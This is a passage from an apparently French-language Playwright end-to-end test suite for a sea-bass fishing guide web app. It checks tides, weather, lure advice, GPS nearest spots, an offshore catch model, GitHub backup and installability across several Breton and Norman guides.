  ok(withC?.cond?.wind != null && withC.cond.wave != null && withC.cond.coef != null && withC.cond.tideH != null && withC.cond.sst != null && /Open-Meteo/.test(withC.cond.src || ""), "sortie : conditions récupérées toutes seules (vent, vagues, eau, coefficient, moment de la marée)" + ` — ${JSON.stringify(withC?.cond || {}).slice(0, 200)}`);
  ok(/Lieu jaune × 3 · Bar × 1/.test(await app()) && /capot \(aucune prise\)/.test(await app()), "sorties : listées avec leurs prises");
  ok(/Pas encore de note : 2 sorties avec conditions sur 8 nécessaires/.test(await app()), "modèle : pas de note avant 8 sorties, et il le dit");
  // Dix sorties de plus (simulées), puis le modèle s'ajuste.
  await page.evaluate((sid) => {
    const L = JSON.parse(localStorage.getItem("bar:offshore:trips"));
    for (let k = 0; k < 10; k++) { const wave = 0.5 + (k % 4) * 0.5; L.push({ id: "t-seed" + String(k).padStart(3, "0"), spotId: sid, date: "2026-10-" + String(10 + k).padStart(2, "0"), start: "07:00", end: "10:00",
      catches: k % 3 === 0 ? [] : [{ sp: "lieu-jaune", n: 1 + Math.round(wave * 2), size: null, kept: false }], tech: [], notes: "", cond: { wind: 10 + k * 2, gust: 20 + k * 3, wave, period: 8 + (k % 3), coef: 50 + k * 4, tideH: k % 12, hour: 8.5, doy: 283 + k, sst: 14 + (k % 2), pressure: 1010 + k }, createdAt: 1, updatedAt: 1 }); }
    localStorage.setItem("bar:offshore:trips", JSON.stringify(L)); }, spots[0].id);
  await page.reload();
  await waitText(page, /Ajusté sur 12 sorties/, 15000).catch(() => {});
  const mtxt = await app();
  ok(/Ajusté sur 12 sorties \(fiabilité faible\)/.test(mtxt) && /ta moyenne : \d,\d\d prises? par heure/.test(mtxt) && /prises × \d+,\d entre le plus bas et le plus haut/.test(mtxt), "modèle : ajusté sur tes 12 sorties, effets dits en clair");
  ok(await page.locator('#offshore-app svg[role=img]').count() === 1 && /Courbe de régression/.test(mtxt), "modèle : courbe de régression affichée");
  await page.waitForFunction(() => /Note/.test(document.querySelector("#offshore-app thead")?.innerText || ""), null, { timeout: 15000 }).catch(() => {});
  ok(/Note/.test(await page.locator("#offshore-app thead").innerText()) && /meilleur moment \d\dh–\d\dh, note \d,\d/.test(await app()), "spot bateau : note par créneau et meilleur moment, une fois le modèle ajusté");
  await page.selectOption("#off-species", "bar");
  ok(/Pas encore de note|Ajusté sur/.test(await app()), "modèle : par espèce (bar)");
  // Suppression d'une sortie (confirmation dans la page) et sauvegarde GitHub.
  await page.getByRole("button", { name: /^Supprimer la sortie du / }).first().click();
  await page.getByRole("button", { name: "Oui, supprimer la sortie" }).click();
  await page.waitForTimeout(2500);
  const remote = gh.files.get("offshore.json");
  const rj = remote ? JSON.parse(remote.content) : null;
  ok(rj && rj.spots.length === 1 && rj.trips.length === 12 && rj.trips.filter((t) => t.deleted).length === 1, "offshore : spots et sorties sauvegardés sur GitHub (offshore.json), suppression notée" + ` — ${rj ? `${rj.spots.length} spots, ${rj.trips.length} sorties` : "absent"}`);
  ok(/Sauvegardé sur GitHub \(offshore\.json\)/.test(await app()), "offshore : état de la sauvegarde affiché");
  // L'onglet Inshore, ouvert après : sa carte se cadre à l'affichage.
  await page.getByRole("tab", { name: /Inshore/ }).click();
  await page.waitForTimeout(500);
  const fitted = await page.evaluate(() => { const c = document.querySelector("#home-app .leaflet-container").getBoundingClientRect(); const p = document.querySelector("path.gspot-concarneau-trevignon")?.getBoundingClientRect();
    return p ? c.width > 0 && p.left >= c.left && p.right <= c.right && p.top >= c.top && p.bottom <= c.bottom : false; });
  ok(fitted, "onglet Inshore ouvert après Offshore : la carte de tous les spots est cadrée");
  ok(errs.length === 0, "onglets et pêche en bateau : aucune erreur JavaScript" + (errs.length ? " — " + errs.slice(0, 2).join(" | ") : ""));
  await page.screenshot({ path: `${SHOTS}/accueil-offshore.png`, fullPage: true });
  await ctx.close();
}
// v8.11 — Accueil : « les spots les plus proches de moi » (position GPS simulée).
{
  const near = async (geo, perms = ["geolocation"]) => {
    const c = await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: "block", ...(geo ? { geolocation: geo } : {}), permissions: perms });
    await c.clock.install({ time: FIXED_NOW });
    await c.route(/open-meteo\.com/, async (route) => { const r = omRespond(route.request().url(), "nominal");
      await route.fulfill({ status: r.status, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify(r.body) }); });
    await c.route(/tile\.openstreetmap\.org/, (route) => route.fulfill({ status: 200, contentType: "image/png", body: PNG1 }));
    const p = await c.newPage(); const errs = []; p.on("pageerror", (e) => errs.push(e.message));
    await p.goto(`${BASE}/`);
    await p.click("#near");
    await p.waitForFunction(() => !document.getElementById("near").disabled, null, { timeout: 20000 }).catch(() => {});
    const r = await p.evaluate(() => ({ count: document.getElementById("count").textContent, hidden: document.getElementById("results").hidden,
      hits: [...document.querySelectorAll("#results a")].map((a) => ({ href: a.getAttribute("href"), t: a.querySelector("strong").textContent, d: a.querySelector(".d")?.textContent || "" })) }));
    return { c, p, r, errs };
  };
  // Sur la digue de Trévignon (Trégunc) : la pointe de Trévignon d'abord, à quelques centaines de mètres.
  const a = await near({ latitude: 47.7925, longitude: -3.8545, accuracy: 15 });
  ok(a.r.hits[0]?.t === "Pointe de Trévignon" && /^à \d+ m à vol d'oiseau$/.test(a.r.hits[0].d) && a.r.hits.length === 8
    && a.r.hits.every((h, i, all) => i === 0 || parseFloat(h.d.replace(/[^\d,]/g, "").replace(",", ".")) * (/ km/.test(h.d) ? 1000 : 1) >= parseFloat(all[i - 1].d.replace(/[^\d,]/g, "").replace(",", ".")) * (/ km/.test(all[i - 1].d) ? 1000 : 1))
    && /Les spots les plus proches de toi \(position à ±15 m\)/.test(a.r.count),
    "accueil GPS : depuis Trévignon, la pointe de Trévignon d'abord, 8 spots du plus près au plus loin" + ` — ${JSON.stringify(a.r).slice(0, 300)}`);
  // v8.15 — Chaque spot proche porte sa note du jour et sa tendance vers demain (↗ ↘ →, stable à 0,2 point près).
  // La note de demain arrive après celles du jour (les sept guides d'abord pour aujourd'hui) : on attend les deux.
  await a.p.waitForFunction(() => document.querySelectorAll("#results a .sc b").length === 8 && document.querySelectorAll("#results a .sc small").length === 8, null, { timeout: 40000 }).catch(() => {});
  const sc = await a.p.evaluate(() => [...document.querySelectorAll("#results a")].map((x) => ({ k: x.getAttribute("data-k"), b: x.querySelector(".sc b")?.textContent || "", m: x.querySelector(".sc small")?.textContent || "", sr: x.querySelector(".sc .sr")?.textContent || "", col: x.querySelector(".sc b")?.style.color || "" })));
  ok(sc.length === 8 && sc.every((x) => /^(\d,\d [↗↘→]|\d,\d|–)$/.test(x.b) && /^dem\. (\d,\d|–)$/.test(x.m) && /^(Note du jour \d,\d|Plus de créneau praticable aujourd'hui)/.test(x.sr) && x.col),
    "accueil GPS : chaque spot proche avec sa note du jour, sa flèche et la note de demain" + ` — ${JSON.stringify(sc.slice(0, 3))}`);
  // La flèche suit les pastilles de la carte : note du jour, puis note de demain (bouton « Demain »).
  const markOf = async (k) => a.p.evaluate((cls) => document.querySelector(`path.gspot-${cls}`)?.getAttribute("data-score"), k.replace("/", "-"));
  const k0 = sc[0].k, today0 = await markOf(k0);
  await a.p.getByRole("button", { name: "Demain", exact: true }).click();
  await a.p.waitForFunction(() => /Notes de demain calculées pour les 7 guides/.test(document.body.innerText), null, { timeout: 40000 }).catch(() => {});
  const tom0 = await markOf(k0);
  const num = (v) => parseFloat(String(v).replace(",", "."));
  const want = today0 === "–" ? "–" : tom0 === "–" ? `${today0} ↘` : num(tom0) - num(today0) > 0.2 + 1e-9 ? `${today0} ↗` : num(tom0) - num(today0) < -0.2 - 1e-9 ? `${today0} ↘` : `${today0} →`;
  ok(sc[0].b === want && sc[0].m === `dem. ${tom0}`, `accueil GPS : flèche cohérente avec la carte (${k0} : aujourd'hui ${today0}, demain ${tom0} → « ${sc[0].b} »)`);
  await a.p.getByRole("button", { name: "Aujourd'hui", exact: true }).click();
  await a.p.fill("#q", "goury");
  ok(await a.p.evaluate(() => document.querySelector("#results a strong")?.textContent) === "Goury", "accueil GPS : taper un nom reprend la recherche par nom");
  ok(/^\d,\d|^–/.test(await a.p.evaluate(() => document.querySelector("#results a .sc b")?.textContent || "")), "recherche par nom : la note du jour s'affiche aussi");
  await a.p.click("#near"); await a.p.waitForTimeout(800);
  await a.p.click("#results a"); await a.p.waitForURL(/concarneau\.html#spots$/);
  ok(/Pointe de Trévignon/.test(await T(a.p)), "accueil GPS : toucher le spot le plus proche ouvre sa fiche");
  ok(a.errs.length === 0, "accueil GPS : aucune erreur JavaScript");
  await a.c.close();
  // Depuis Paris : aucun guide ne couvre la position, le plus proche est annoncé avec sa distance.
  const b = await near({ latitude: 48.78, longitude: 2.31, accuracy: 30 });
  ok(/Aucun guide ne couvre ta position/.test(b.r.count) && /est à \d+ km/.test(b.r.count), "accueil GPS : loin de tout guide, message clair et distance du plus proche" + ` — ${b.r.count}`);
  await b.c.close();
  // Localisation refusée : explication, aucune liste.
  const d = await near(null, []);
  ok(/Position refusée|Position indisponible|Position introuvable/.test(d.r.count) && d.r.hidden, "accueil GPS : position refusée, explication sans liste" + ` — ${d.r.count}`);
  await d.c.close();
}
// Dans l'application installée, l'aide à l'installation disparaît.
{
  const ctx = await browser.newContext({ ...devices["Pixel 7"], locale: "fr-FR", serviceWorkers: "block" });
  await ctx.addInitScript(() => { const mm = window.matchMedia.bind(window);
    window.matchMedia = (q) => (/display-mode:\s*standalone/.test(q) ? { matches: true, media: q, addEventListener() {}, removeEventListener() {}, addListener() {}, removeListener() {} } : mm(q)); });
  const page = await ctx.newPage();
  await page.goto(`${BASE}/`);
  ok(!(await page.isVisible("#install")) && /Chercher un spot/.test(await T(page)) && await page.locator("details.dept").count() === 2, "application installée : accueil sans bloc d'installation");
  await ctx.close();
}
// Installabilité selon Chromium lui-même (critères d'installation de Chrome), depuis l'accueil
// et chaque guide. Il faut le Chromium complet (nouveau mode sans écran) et un profil non
// privé : l'ancien mode sans écran répond « installable » même sans manifeste.
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pwa-"));
  const ctx = await chromium.launchPersistentContext(dir, { channel: "chromium", locale: "fr-FR" });
  watchCsp(ctx, "[installabilité] ");
  await ctx.route(/open-meteo\.com/, async (route) => { const r = omRespond(route.request().url(), "nominal");
    await route.fulfill({ status: r.status, contentType: "application/json", body: JSON.stringify(r.body) }); });
  await ctx.route(/tile\.openstreetmap\.org/, (route) => route.fulfill({ status: 200, contentType: "image/png", body: PNG1 }));
  const page = ctx.pages()[0] || await ctx.newPage();
  const cdp = await ctx.newCDPSession(page);
  const check = async (u) => {
    await page.goto(`${BASE}/${u}`); await page.waitForLoadState("load");
    await page.evaluate(() => navigator.serviceWorker?.ready);
    const inst = (await cdp.send("Page.getInstallabilityErrors")).installabilityErrors.map((e) => e.errorId);
    const am = await cdp.send("Page.getAppManifest");
    const id = await cdp.send("Page.getAppId").catch(() => ({}));
    return { errs: [...inst, ...am.errors.map((e) => e.message)], appId: id.appId };
  };
  // Témoin : sans manifeste, Chromium doit refuser (sinon le contrôle ne prouverait rien).
  await ctx.route(/\/manifest\.json$/, (route) => route.fulfill({ status: 404, body: "" }));
  const neg = await check("");
  ok(neg.errs.length > 0, "témoin : manifeste absent → Chromium refuse l'installation (" + neg.errs.join(", ") + ")");
  await ctx.unroute(/\/manifest\.json$/);
  const ids = [];
  for (const u of ["", "logonna.html", "pirou.html", "plouguerneau.html", "audierne.html", "carantec.html", "concarneau.html", "crozon.html"]) {
    const r = await check(u);
    ids.push(r.appId);
    ok(r.errs.length === 0, `installable selon Chromium : /${u}` + (r.errs.length ? " — " + r.errs.join(", ") : ""));
  }
  ok(ids.every((x) => x === `${BASE}/`), "accueil et guides : une seule et même application, identifiant = dossier du site" + ` — ${ids.join(", ")}`);
  await ctx.close(); fs.rmSync(dir, { recursive: true, force: true });
}

// Profil de chaque guide : ce que les parcours vérifient sur ses fiches.
const PROFILE = {
  logonna: { nSpots: 11, header: /SPUMY[\s·]+Logonna-Daoulas/, target: "Moulin Mer", pick: ["rostiviec", "Rostiviec"], sec: ["Térénez", /coef > 85|Aujourd'hui :/], reg: /3 bars \/ pêcheur \/ jour · taille minimale 42 cm/ },
  pirou: { nSpots: 10, header: /SPUMY[\s·]+Pirou Plage/, target: "Goury", pick: ["portbail", "Portbail"], sec: ["Goury", /6 nœuds/], reg: /3 bars \/ pêcheur \/ jour · taille minimale 42 cm/ },
  plouguerneau: { nSpots: 10, header: /SPUMY[\s·]+Plouguerneau/, target: "Pointe de Corsen", pick: ["kerlouan", "Kerlouan"], sec: ["Pointe de Corsen", /falaises/], reg: /3 bars \/ pêcheur \/ jour · taille minimale 42 cm/ },
  audierne: { nSpots: 11, header: /SPUMY[\s·]+Audierne/, target: "Pointe du Raz", pick: ["penhors", "Penhors"], sec: ["Pointe du Raz", /6 nœuds/], reg: /[23] bars \/ pêcheur \/ jour · taille minimale 42 cm/ },
  carantec: { nSpots: 7, header: /SPUMY[\s·]+Carantec/, target: "Pointe de Primel", pick: ["locquirec", "Locquirec"], sec: ["Barnénez", /passages rocheux/], reg: /3 bars \/ pêcheur \/ jour · taille minimale 42 cm/ },
  concarneau: { nSpots: 10, header: /SPUMY[\s·]+Concarneau/, target: "Pointe de Trévignon", pick: ["laita", "Estuaire de la Laïta"], sec: ["Pointe de Mousterlin", /porte de sortie/], reg: /2 bars \/ pêcheur \/ jour · taille minimale 42 cm/, south: true },
  crozon: { nSpots: 7, header: /SPUMY[\s·]+Crozon/, target: "Pointe de Dinan", pick: ["pentrez", "Plage de Pentrez"], sec: ["Pointe de Dinan", /gaffe aux lames/], reg: /3 bars \/ pêcheur \/ jour · taille minimale 42 cm/ },
};
for (const site of (process.env.ONLY ? process.env.ONLY.split(",").filter((x) => PROFILE[x]) : Object.keys(PROFILE))) {
  const L = (s) => `[${site}] ${s}`;
  const PF = PROFILE[site];
  const nSpots = PF.nSpots;
  // ── 1. Parcours nominal ──
  {
    const { ctx, page, errors, om } = await openApp(site);
    await waitText(page, WX);
    const txt = await T(page);
    ok(/Marée/.test(txt) && /coef \d+/.test(txt) && /PM \d\dh\d\d/.test(txt), L("synthèse : marée affichée"));
    ok(/km\/h/.test(txt) && /hPa/.test(txt), L("synthèse : météo réelle affichée (km/h, hPa)"));
    // Jour (3 requêtes), puis la tendance de la semaine, chargée d'office (3 requêtes pour 7 jours).
    await page.getByRole("group", { name: "Note du meilleur créneau, jour par jour" }).waitFor({ timeout: 20000 }).catch(() => {});
    await waitCalls(om, 6); await page.waitForTimeout(300);
    ok(om.calls === 6, L(`3 requêtes Open-Meteo pour le jour, 3 pour la semaine (${om.calls})`));
    ok(/🌬 [A-Z]{1,3} \d+ km\/h/.test(txt), L("verdict : météo du créneau affichée"));
    ok(/Leurre conseillé pour ce créneau/.test(txt) && /Poids · /.test(txt) && /Couleur ·/.test(txt) && /Nage ·/.test(txt), L("synthèse : leurre précis de ta boîte (poids, couleur, nage)"));
    ok(/(Asturie|Patchinko|Z Claw|Mr Joe|Black Minnow|Crazy Paddle Tail|Master Shad|Dark Sleeper|Spindle Worm|X-Layer|Craw)/.test(txt.split("Leurre conseillé pour ce créneau")[1]?.slice(0, 80) || ""), L("synthèse : le leurre nommé est un modèle de ta boîte"));
    await tab(page, "Plus");
    ok(/Journal gardé sur cet appareil/.test(await T(page)), L("sommaire Plus : état de la sauvegarde (local)"));
    await tab(page, "Synthèse");
    ok(PF.header.test(txt) && Object.entries(PROFILE).every(([k, o]) => k === site || !o.header.test(txt)), L("en-tête propre au site (aucun texte d'une autre application)"));
    // v9.1 — Sécurité et confiance : à part de la note, jamais de feu vert, jamais un nombre.
    const sec = await page.locator("#securite-verdict").innerText().catch(() => "");
    ok(/^Sécurité · (Alerte sécurité|Prudence|Aucune alerte connue)/.test(sec) && /Vérifie sur place/.test(sec) && !/sûr|serein|SAFE/i.test(sec), L(`verdict : sécurité à part, « vérifie sur place », jamais de feu vert — ${sec.split("\n")[0]}`));
    ok(!/\/ ?100\b/.test(txt) && /Confiance (élevée|moyenne|faible)/.test(txt), L("verdict : une seule échelle (/10), confiance en mots, aucun /100"));
    await page.getByRole("button", { name: /Confiance/ }).click();
    ok(/Classement (stable|sensible|volatil)/.test(await T(page)) && /pas une probabilité/.test(await T(page)), L("confiance : le détail dit ce que le conseil avait et ce qui manquait"));
    await page.getByRole("button", { name: /Confiance/ }).click();
    if (site === "logonna" || site === "pirou") {
      await page.getByRole("button", { name: /Mode terrain/ }).click();
      const ft = await page.locator("#mode-terrain").innerText().catch(() => "");
      ok(/Marée\n(Montante|Descendante)/.test(ft) && /(Pleine|Basse) mer à \d\d:\d\d/.test(ft) && /Vent\n/.test(ft) && /Sécurité · /.test(ft) && !/1 à 4 m|Walking the dog/.test(ft), L("mode terrain : marée montante ou descendante calculée, heure de la prochaine, rien d'inventé"));
      await page.reload(); await page.locator("#mode-terrain").waitFor({ timeout: 15000 }).catch(() => {});
      ok(await page.locator("#mode-terrain").count() === 1 && await page.getByRole("button", { name: /Mode terrain/ }).getAttribute("aria-pressed") === "true", L("mode terrain : gardé sur l'appareil"));
      await page.getByRole("button", { name: /Mode terrain/ }).click();
      ok(await page.locator("#mode-terrain").count() === 0 && await page.locator("#securite-verdict").count() === 1, L("mode terrain : retour au verdict détaillé"));
    }
    const sw = await page.evaluate(() => [document.scrollingElement.scrollWidth, window.innerWidth]);
    ok(sw[0] <= sw[1] + 1, L(`pas de défilement horizontal sur mobile (${sw[0]} ≤ ${sw[1]})`));
    const yv = await page.evaluate(() => { const f = (re) => [...document.querySelectorAll("div,span,h2")].find((e) => re.test(e.textContent) && e.children.length === 0); const a = f(/^Meilleur choix/), b = f(/^Conditions du jour$/); return a && b ? [a.getBoundingClientRect().top, b.getBoundingClientRect().top] : null; });
    ok(yv && yv[0] < yv[1] && yv[0] < 700, L(`verdict du jour en tête de page (${yv && Math.round(yv[0])} px)`));
    await page.screenshot({ path: `${SHOTS}/${site}-synthese.png` });
    // Chaque tuile ouvre l'onglet qui la détaille
    await page.getByRole("button", { name: /Marée/ }).first().click(); await page.waitForTimeout(300);
    ok(/Calculée sur l'appareil/.test(await T(page)) && /Pleine mer/.test(await T(page)) && (await page.evaluate(() => location.hash)) === "#maree", L("tuile Marée → onglet Marée (adresse #maree)"));
    await page.goBack(); await page.waitForTimeout(300);
    ok(READY.test(await T(page)), L("bouton retour → synthèse"));
    await tab(page, "Météo");
    ok(/Open-Meteo · AROME/.test(await T(page)) && /Spot par spot/.test(await T(page)), L("onglet Météo : source et météo spot par spot"));
    // Un spot choisi hors du TOP 3 doit s'afficher (et non le n°1)
    const target = PF.target;
    await tab(page, "Spots");
    await btn(page, /^Voir les \d+/).click();
    await page.getByRole("button", { name: new RegExp(target) }).first().click();
    await page.waitForTimeout(500);
    ok(await page.evaluate((n) => [...document.querySelectorAll("h2")].some((h) => h.textContent === n), target), L(`fiche du spot choisi hors TOP 3 (${target})`));
    await btn(page, /^Terrain$/).click();
    ok(/Terrain · encombrement 3\/3/.test(await T(page)) && /Pas de pêche à gratter/.test(await T(page)), L(`${target} : fiche terrain affichée`));
    await tab(page, "Leurres");
    await btn(page, /Ce que mange le bar ce mois-ci/).click();
    if (site === "logonna") ok(/Ici, pas de pêche (au fond|à mi-eau)/.test(await T(page)) && /Moulin Mer/.test(await page.inputValue('select[aria-label="Spot"]').then(() => T(page))), L("Moulin Mer : proie de fond réécrite (pas de grattage)"));
    const lt = await T(page);
    ok(/Dans ta boîte, pour ce créneau/.test(lt) && /Poids\n[^\n]*\d/.test(lt) && /Famille de leurre/.test(lt) && /Couleur/.test(lt) && /Taille et poids/.test(lt) && /Animation/.test(lt), L("onglet Leurres : conseil complet"));
    ok(/(vent (de face|de dos|de travers) F\d)/.test(lt) && /(très peu d'eau|peu d'eau|tombant)/.test(lt), L("onglet Leurres : vent par rapport au pêcheur et profondeur estimée affichés"));
    await page.getByText("Toute ta boîte, classée pour ce créneau").click();
    await page.getByText("Fiches techniques de ta boîte").click();
    const lt2 = await T(page);
    ok(/Xorus Asturie/.test(lt2) && /130 mm : 27 g/.test(lt2) && /Sakura Mr Joe/.test(lt2) && /120 mm : 35 g/.test(lt2), L("onglet Leurres : fiches techniques relevées (Asturie 130 : 27 g, Mr Joe 120 : 35 g)"));
    ok(await page.locator('a[href*="peche.com"]').count() >= 5, L("onglet Leurres : sources en lien"));
    await tab(page, "Synthèse");
    await page.screenshot({ path: `${SHOTS}/${site}-full.png`, fullPage: true });
    // Jour suivant puis précédent
    const tideTile = () => page.evaluate(() => [...document.querySelectorAll("button")].find((b) => /^↕ Marée/.test(b.textContent.trim()))?.textContent || "");
    const tideBefore = await tideTile();
    await page.click('button[title="Jour suivant"]');
    await page.waitForTimeout(800); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    ok(tideBefore && tideBefore !== await tideTile(), L("jour suivant : marée recalculée"));
    ok(om.calls === 6, L(`jour suivant : météo reprise de la semaine déjà téléchargée (${om.calls})`));
    await page.click('button[title="Jour précédent"]');
    await page.waitForTimeout(800); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    ok(om.calls === 6, L(`retour au jour : météo servie par le cache (${om.calls})`));
    await page.click('button[title="Retélécharger la météo (ignore le cache)"]');
    await waitCalls(om, 9); await page.waitForTimeout(300); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    ok(om.calls === 9, L(`bouton retélécharger (${om.calls})`));
    // Journal : saisie et persistance après rechargement
    await tab(page, "Journal");
    await page.fill('input[placeholder^="Asturie"]', "Test e2e leurre");
    await page.fill('input[type="time"]', "19:15");
    await btn(page, /^Enregistrer$/).click();
    await page.waitForTimeout(500);
    const stored = await page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith("bar:journal:")).map((k) => localStorage.getItem(k)).join(""));
    ok(/Test e2e leurre/.test(stored), L("session enregistrée dans le navigateur"));
    const ent = JSON.parse(stored || "[]").find((e) => e.lure === "Test e2e leurre");
    ok(ent && ent.heure === "19:15" && ent.cond && ent.cond.vent && ent.cond.vent.kmh > 0 && ent.cond.coef > 0 && ent.cond.phase, L("session : heure et conditions enregistrées (marée, vent, coef)"));
    ok(/19h15 · (montant|descendant)/.test(await T(page)), L("journal : conditions affichées sous la session"));
    await page.reload(); await waitText(page, /Nouvelle session/);
    ok((await page.evaluate(() => location.hash)) === "#journal", L("rechargement : l'onglet ouvert est conservé"));
    await page.waitForTimeout(600);
    ok(om.calls === 9, L(`rechargement : météo du cache, aucun appel (${om.calls})`));
    ok(/Test e2e leurre/.test(await T(page)), L("journal conservé après rechargement"));
    ok(errors.length === 0, L("aucune erreur JavaScript" + (errors.length ? " — " + errors.slice(0, 2).join(" | ") : "")));
    await ctx.close();
  }
  // ── 1 bis. Heures de pêche, semaine, frise ──
  {
    const { ctx, page, errors, om } = await openApp(site);
    await waitText(page, WX);
    await btn(page, /Fiche du spot/).click(); await page.waitForTimeout(400);
    ok(await page.locator('svg[aria-label^="Journée sur"]').count() === 1, L("frise de la journée affichée dans la fiche du spot"));
    await page.selectOption('select[aria-label="Début"]', "6");
    await page.selectOption('select[aria-label="Fin"]', "22");
    await page.waitForTimeout(300);
    await tab(page, "Synthèse");
    const vt = await T(page);
    const m = vt.slice(vt.indexOf("Meilleur choix")).match(/(\d{2})h(\d{2}) → (\d{2})h(\d{2})/);
    const s = m ? +m[1] + +m[2] / 60 : null, e = m ? +m[3] + +m[4] / 60 : null;
    ok(m && Math.min(e < s ? e + 24 : e, 22) - Math.max(s, 6) >= 0.5, L(`heures 6 h → 22 h : le verdict propose un créneau dans ces heures (${m && m[0]})`));
    await page.reload(); await waitText(page, READY);
    await tab(page, "Spots");
    ok(await page.inputValue('select[aria-label="Début"]') === "6", L("heures de pêche mémorisées sur l'appareil"));
    await tab(page, "Synthèse");
    // v8.7 : la tendance de la semaine est en tête de la synthèse, chargée d'office (sans toucher de bouton).
    const strip = page.getByRole("group", { name: "Note du meilleur créneau, jour par jour" });
    await strip.waitFor({ timeout: 20000 }).catch(() => {});
    const rows = await strip.getByRole("button").count();
    ok(rows === 7, L(`semaine : chargée d'office, 7 jours dans la tendance (${rows})`));
    // v8.14 — Départager une semaine « toute verte » : ★ sur le meilleur jour, spots au vert, ce qui porte la note.
    const wk = await page.evaluate(() => { const g = document.querySelector('[aria-label="Note du meilleur créneau, jour par jour"]');
      return { stars: g.querySelectorAll("[data-star]").length, best: [...g.querySelectorAll("button")].filter((b) => /meilleur jour/.test(b.getAttribute("aria-label"))).length,
               vert: [...g.querySelectorAll("button")].filter((b) => /spots? au vert sur \d+/.test(b.getAttribute("aria-label"))).length, txt: document.body.innerText }; });
    ok(wk.stars >= 1 && wk.stars === wk.best && wk.vert >= 1 && /spots? au vert sur \d+/.test(wk.txt) && /Ce qui porte la note : /.test(wk.txt), L(`semaine : ★ meilleur jour, spots au vert par jour, ce qui porte la note (${wk.stars} ★, ${wk.vert} jours)`));
    const order = await page.evaluate(() => { const top = (re) => { const el = [...document.querySelectorAll("section, div")].find((n) => n.children.length && re.test(n.firstElementChild?.textContent || "")); return el ? el.getBoundingClientRect().top : null; };
      const wk = [...document.querySelectorAll("*")].find((n) => n.childElementCount === 0 && /^Tendance de la semaine$/.test(n.textContent.trim()));
      const vd = [...document.querySelectorAll("*")].find((n) => n.childElementCount === 0 && /^Meilleur choix/.test(n.textContent.trim()));
      return { wk: wk?.getBoundingClientRect().top ?? null, vd: vd?.getBoundingClientRect().top ?? null, top }; });
    // v8.9 : la réponse du jour d'abord (audit UX), la tendance de la semaine ensuite.
    ok(order.wk != null && order.vd != null && order.vd < order.wk, L(`synthèse : verdict du jour au-dessus de la tendance de la semaine (${order.vd} < ${order.wk})`));
    const c1 = om.calls;
    await strip.getByRole("button").nth(2).click();
    await page.waitForTimeout(900); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    ok(om.calls === c1, L("semaine → jour choisi : météo reprise du cache, aucune requête"));
    ok(await strip.getByRole("button").nth(2).getAttribute("aria-pressed") === "true", L("semaine : le jour choisi est marqué dans la tendance"));
    ok(errors.length === 0, L("heures/semaine/frise : aucune erreur JavaScript" + (errors.length ? " — " + errors[0] : "")));
    await ctx.close();
  }
  // ── 1 ter. Onglets, carte, sécurité, orientation, session en cours, réglementation ──
  {
    const { ctx, page, errors, om } = await openApp(site);
    await waitText(page, WX);
    const tabs = await page.evaluate(() => [...document.querySelectorAll("nav.bottom-nav [role=tab]")].map((b) => b.textContent.trim()));
    ok(tabs.join(",") === "Décision,Carte,Journal,Matériel,Plus", L(`barre du bas : cinq entrées (${tabs.join(",")})`));
    const navPos = await page.evaluate(() => { window.scrollTo(0, 1500); return new Promise((r) => setTimeout(() => { const b = document.querySelector("nav.bottom-nav").getBoundingClientRect(); r({ bottom: b.bottom, vh: innerHeight, h: b.height }); }, 150)); });
    ok(Math.abs(navPos.bottom - navPos.vh) <= 1 && navPos.h >= 56, L(`barre du bas fixée en bas de l'écran après défilement (${JSON.stringify(navPos)})`));
    await tab(page, "Plus");
    const hub = await T(page);
    ok(["Marée", "Météo", "Saison", "Règles", "Photos", "Réglages", "Changer de guide"].every((x) => hub.includes(x)), L("sommaire Plus : les cinq écrans de référence, les réglages, le changement de guide"));
    await tab(page, "Marée");
    ok((await page.evaluate(() => location.hash)) === "#maree" && await page.getByRole("tab", { name: "Plus", exact: true }).getAttribute("aria-selected") === "true"
      && await page.getByRole("button", { name: "Retour au sommaire Plus" }).count() === 1, L("Plus → Marée : adresse #maree, entrée Plus active, retour au sommaire"));
    await page.getByRole("button", { name: "Retour au sommaire Plus" }).click(); await page.waitForTimeout(200);
    ok((await page.evaluate(() => location.hash)) === "#plus", L("retour au sommaire Plus"));
    await tab(page, "Synthèse");
    ok(PF.reg.test(await T(page)), L("réglementation 2026 rappelée sur la synthèse"));
    // Accessibilité : titre, onglets reliés au panneau, clavier
    const aria = await page.evaluate(() => ({ h1: document.querySelectorAll("h1").length, panel: document.querySelector('[role="tabpanel"]')?.getAttribute("aria-labelledby"),
      sel: document.querySelector('[role="tab"][aria-selected="true"]')?.id, tabbable: [...document.querySelectorAll('[role="tab"]')].filter((b) => b.tabIndex === 0).length }));
    ok(aria.h1 === 1 && aria.panel === aria.sel && aria.tabbable === 1, L(`onglets : h1 unique, panneau relié, un seul onglet dans l'ordre de tabulation (${JSON.stringify(aria)})`));
    await page.focus('[role="tab"][aria-selected="true"]');
    await page.keyboard.press("ArrowRight"); await page.waitForTimeout(150);
    const kb1 = await page.evaluate(() => [location.hash, document.activeElement?.textContent]);
    await page.keyboard.press("End"); await page.waitForTimeout(150);
    const kb2 = await page.evaluate(() => location.hash);
    await page.keyboard.press("Home"); await page.waitForTimeout(150);
    ok(kb1[0] === "#spots" && kb1[1] === "Carte" && kb2 === "#plus" && (await page.evaluate(() => location.hash)) === "#synthese", L(`onglets au clavier : flèche, fin, début (${kb1.join(" ")} · ${kb2})`));
    // Meilleur créneau de plein jour, quand le verdict tombe en basse lumière ou de nuit
    const dayCard = /Si tu pêches en plein jour/.test(await T(page)), verdictLow = /aube|crépuscule|nuit/i.test(await page.evaluate(() => document.querySelector("main")?.innerText.split("Leurre conseillé")[0] || ""));
    ok(dayCard === verdictLow || (verdictLow && !dayCard && !/jour/.test(await T(page))), L(`synthèse : créneau de plein jour affiché si le verdict est en basse lumière (${verdictLow ? "basse lumière" : "jour"}, carte ${dayCard ? "affichée" : "absente"})`));
    if (dayCard) {
      await btn(page, /Le conseil leurres de ce créneau/).click();
      await page.waitForTimeout(300);
